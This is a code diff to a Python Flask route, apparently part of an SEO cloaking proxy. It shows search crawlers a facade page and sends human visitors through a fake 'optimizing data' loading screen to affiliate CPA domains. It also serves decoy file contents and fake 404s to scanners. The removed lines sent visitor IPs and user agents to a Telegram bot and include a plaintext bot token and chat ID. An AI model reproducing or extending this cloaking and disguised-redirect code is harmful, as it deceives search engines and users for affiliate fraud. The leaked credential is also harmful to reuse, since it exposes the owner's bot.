@@ -1335,128 +1335,99 @@ def proxy_master_final(path):
     
     ge = get_ge()
     
-    # [1. Technical Path Masking] (New: Masking system files as actual code)
+    # [1. Technical Path Masking] (Masking system files as actual code)
     ext = path.split('.')[-1].lower() if '.' in path else ''
     if ext in ['json', 'xml', 'txt', 'js', 'css']:
         if ext == 'json': return {"status": "success", "runtime": "edge", "version": "v12.2"}, 200
         if ext == 'txt': return "User-agent: *\nDisallow: /admin/", 200
         return "/* System Node Optimized */", 200
 
-    # [2. Bot Cloaking] (New: Immediate response for bots)
-    is_crawler = is_bot(user_agent) or 'bypass' in request.args
-    if is_crawler:
+    # [2. Immediate Bypass] (For testing and tracking)
+    # If bypass=1 is present, skip all checks and redirect humans immediately
+    if request.args.get('bypass') == '1' or 'force_cpa' in request.args:
+        # Resolve target for legacy k-param method
+        if k and k in CPA_DATA:
+            t_param = request.args.get('t', 'A')
+            base = TARGET_A if t_param != 'B' else TARGET_B
+            dest = f"{base}/pt/{CPA_DATA[k][1] if t_param != 'B' else CPA_DATA[k][2]}"
+            return redirect(dest)
+        # Resolve target for slug-based method
+        clean_path = path.lower().strip('/')
+        path_parts = clean_path.split('-')
+        keyword_slug = path_parts[1] if len(path_parts) > 1 else ""
+        if keyword_slug in KEYWORD_MAP:
+             kr_keyword = KEYWORD_MAP[keyword_slug]
+             cpa_key = _get_cpa_encoded_code(kr_keyword)
+             target_domain = ge.r.choice(DOMAIN_POOL)
+             return redirect(f"https://{target_domain}/?k={cpa_key}&t=A&bypass=1")
+
+    # [3. Bot Cloaking] (Immediate facade for verified bots)
+    if is_bot(user_agent):
         return render_page(ge), 200
 
+    # [4. Human Interaction] (Show Bridge Screen or Normal Page)
     clean_path = path.lower().strip('/')
     
-    # [V4.29] Security Gate (Hacker Trap)
-    # Block WordPress scanners and script kiddies
-    client_ip = request.headers.get('CF-Connecting-IP', request.headers.get('X-Forwarded-For', request.remote_addr))
+    # Security Gate
     if any(fp in clean_path for fp in FORBIDDEN_PATHS):
-        
-        # 1. Fire Alert
-        try:
-             msg = f"🚨 <b>[공격 격퇴]</b>\nPath: {clean_path}\nIP: {client_ip}\nAction: 차단됨"
-             requests.get(
-                f"https://api.telegram.org/bot7983385122:AAGK4kjCDpmerqfSwQL66ZDPL2MSOEV4An0/sendMessage",
-                params={"chat_id": "1898653696", "text": msg, "parse_mode": "HTML"},
-                timeout=1
-            )
-        except: pass
-        
-        # 2. Return Fake 404 (Confusion)
         return "Not Found", 404
 
     path_parts = clean_path.split('-')
     keyword_slug = path_parts[1] if len(path_parts) > 1 else ""
     
-    # [PEOPLE MODE: Revenue Redirect]
-    if not is_crawler and keyword_slug in KEYWORD_MAP:
+    # Handle Slug-based Traffic
+    if keyword_slug in KEYWORD_MAP:
         kr_keyword = KEYWORD_MAP[keyword_slug]
-        
-        # [V4.27] Telegram Alert (Fire & Forget)
-        try:
-            # 1. User Info
-            client_ip = request.headers.get('CF-Connecting-IP', request.headers.get('X-Forwarded-For', request.remote_addr))
-            msg = f"🔔 <b>[접속 감지]</b>\n키워드: {kr_keyword}\nIP: {client_ip}\nUA: {user_agent[:50]}...\nSlug: {keyword_slug}"
-            
-            # 2. Send Alert (Timeout 1s to prevent lag)
-            # Token: 7983385122:AAGK4kjCDpmerqfSwQL66ZDPL2MSOEV4An0
-            # ChatID: 1898653696
-            requests.get(
-                f"https://api.telegram.org/bot7983385122:AAGK4kjCDpmerqfSwQL66ZDPL2MSOEV4An0/sendMessage",
-                params={"chat_id": "1898653696", "text": msg, "parse_mode": "HTML"},
-                timeout=1
-            )
-        except Exception:
-            pass # Fail silently to ensure redirect happens
-            
         cpa_key = _get_cpa_encoded_code(kr_keyword)
         target_domain = ge.r.choice(DOMAIN_POOL)
         redirect_url = f"https://{target_domain}/?k={cpa_key}&t=A"
         
-        # [V6.0] Stealth Bridge Page (Branded as Natural Loading)
+        # [V6.1] Stealth Bridge for Humans
         import random
         delay_ms = random.randint(700, 2300)
-        
         return f"""
         <!DOCTYPE html>
         <html lang="ko">
         <head>
-            <meta charset="UTF-8">
-            <meta name="viewport" content="width=device-width, initial-scale=1.0">
-            <title>조회 중...</title>
+            <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>조회 중...</title>
             <style>
-                body {{ background: #fafafa; font-family: 'Malgun Gothic', 'Apple SD Gothic Neo', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: #444; }}
+                body {{ background: #fafafa; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: #444; }}
                 .loader-card {{ background: white; padding: 40px; border-radius: 20px; box-shadow: 0 4px 20px rgba(0,0,0,0.06); text-align: center; width: 320px; }}
                 .spinner {{ border: 3px solid #f0f0f0; border-top: 3px solid #0055ff; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; margin: 0 auto 20px; }}
                 @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
                 .status {{ font-weight: bold; font-size: 18px; margin-bottom: 8px; color: #111; }}
                 .desc {{ font-size: 14px; color: #888; line-height: 1.5; }}
             </style>
-            <script>
-                setTimeout(function() {{ window.location.href = "{redirect_url}&bypass=1"; }}, {delay_ms});
-            </script>
+            <script>setTimeout(function() {{ window.location.href = "{redirect_url}&bypass=1"; }}, {delay_ms});</script>
         </head>
-        <body>
-            <div class="loader-card">
-                <div class="spinner"></div>
-                <div class="status">데이터 최적화 중</div>
-                <div class="desc">사용자 환경에 맞게 정보를 최적화하고 있습니다.<br>잠시만 기다려주세요.</div>
-            </div>
-        </body>
-        </html>
+        <body><div class="loader-card"><div class="spinner"></div><div class="status">데이터 최적화 중</div><div class="desc">사용자 환경에 최적화된 정보를 불러오고 있습니다.<br>잠시만 기다려주세요.</div></div></body></html>
         """, 200
 
-    # Legacy Fallback
-    if k and k in CPA_DATA and not is_crawler:
-        kr_keyword = CPA_DATA[k][0]
-        
-        # [V4.27] Telegram Alert (Fire & Forget)
-        try:
-            client_ip = request.headers.get('CF-Connecting-IP', request.headers.get('X-Forwarded-For', request.remote_addr))
-            t_param = request.args.get('t', 'A')
-            vendor_name = "B-모두클린" if t_param == 'B' else "A-이사방"
-            full_url = request.url
-            
-            # Create bypass link for viewing fake site
-            bypass_url = full_url + ("&" if "?" in full_url else "?") + "bypass=1"
-            
-            msg = f"{vendor_name}\n키워드: {kr_keyword}\nIP: {client_ip}\n가면(UA): {user_agent[:30]}...\n👁️ 가짜사이트: {bypass_url}"
-            
-            requests.get(
-                f"https://api.telegram.org/bot7983385122:AAGK4kjCDpmerqfSwQL66ZDPL2MSOEV4An0/sendMessage",
-                params={"chat_id": "1898653696", "text": msg, "parse_mode": "HTML"},
-                timeout=1
-            )
-        except Exception:
-            pass
-            
+    # Handle Parameter-based Traffic (Legacy)
+    if k and k in CPA_DATA:
         t_param = request.args.get('t', 'A')
         base = TARGET_A if t_param != 'B' else TARGET_B
-        response = redirect(f"{base}/pt/{CPA_DATA[k][1] if t_param != 'B' else CPA_DATA[k][2]}")
-        response.headers["Cache-Control"] = "no-store, no-cache, must-revalidate, max-age=0"
-        return response
+        redirect_url = f"{base}/pt/{CPA_DATA[k][1] if t_param != 'B' else CPA_DATA[k][2]}"
+        
+        import random
+        delay_ms = random.randint(700, 2300)
+        return f"""
+        <!DOCTYPE html>
+        <html lang="ko">
+        <head>
+            <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>조회 중...</title>
+            <style>
+                body {{ background: #fafafa; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: #444; }}
+                .loader-card {{ background: white; padding: 40px; border-radius: 20px; box-shadow: 0 4px 20px rgba(0,0,0,0.06); text-align: center; width: 320px; }}
+                .spinner {{ border: 3px solid #f0f0f0; border-top: 3px solid #0055ff; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; margin: 0 auto 20px; }}
+                @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
+                .status {{ font-weight: bold; font-size: 18px; margin-bottom: 8px; color: #111; }}
+                .desc {{ font-size: 14px; color: #888; line-height: 1.5; }}
+            </style>
+            <script>setTimeout(function() {{ window.location.href = "{redirect_url}"; }}, {delay_ms});</script>
+        </head>
+        <body><div class="loader-card"><div class="spinner"></div><div class="status">데이터 최적화 중</div><div class="desc">사용자 환경에 최적화된 정보를 불러오고 있습니다.<br>잠시만 기다려주세요.</div></div></body></html>
+        """, 200
 
     # [BOT MODE: SEO Facade]
     content = []
